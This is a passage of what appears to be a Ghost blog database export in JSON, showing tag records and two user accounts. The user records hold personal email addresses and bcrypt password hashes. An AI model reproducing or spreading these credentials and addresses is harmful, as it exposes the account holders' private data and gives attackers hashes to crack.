557623330001332761","name":"yardi","slug":"yardi","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332762","name":"yardi-matrix","slug":"yardi-matrix","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null},{"id":"5b8ea0557623330001332763","name":"yet another post","slug":"yet-another-post","description":"","feature_image":null,"parent_id":null,"visibility":"public","meta_title":null,"meta_description":null,"created_at":"2018-09-04T15:10:14.000Z","created_by":"1","updated_at":"2018-09-04T15:10:14.000Z","updated_by":null}],"users":[{"id":"1","name":"D. Scott Boggs","slug":"d-scott-boggs","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$yEWDJqSToYorS5PuNsUjb.Cs6FHHo3RfBsIP8AiKceefNLAdrvSQW","email":"scott@tams.tech","profile_image":null,"cover_image":null,"bio":null,"website":null,"location":null,"facebook":null,"twitter":null,"accessibility":"{\"nightShift\":true}","status":"active","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":null,"last_seen":"2018-09-04T15:09:10.000Z","created_at":"2018-09-04T15:07:55.000Z","created_by":"1","updated_at":"2018-09-04T15:10:40.000Z","updated_by":"1"},{"id":"5b8ea0547623330001332617","name":"owen","slug":"owen","ghost_auth_access_token":null,"ghost_auth_id":null,"password":"$2a$10$NBVdAl6WQHZmgApiJCGgq.G3yxwOUR5yiGCipFq6VDUuwRQcGEk8W","email":"owen@tams.tech","profile_image":null,"cover_image":null,"bio":"The best.\r\n-- Scott","website":"http://owen.madscientists.co","location":null,"facebook":null,"twitter":null,"accessibility":null,"status":"locked","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"tour":null,"last_seen":null,"created_at":"2017-09-12T03:45:47.000Z","created_by":"5b8ea0547623330001332618","updated_at":"2018-09-04T15:10:13.000Z","updated_by":null}],"webhooks":[]}}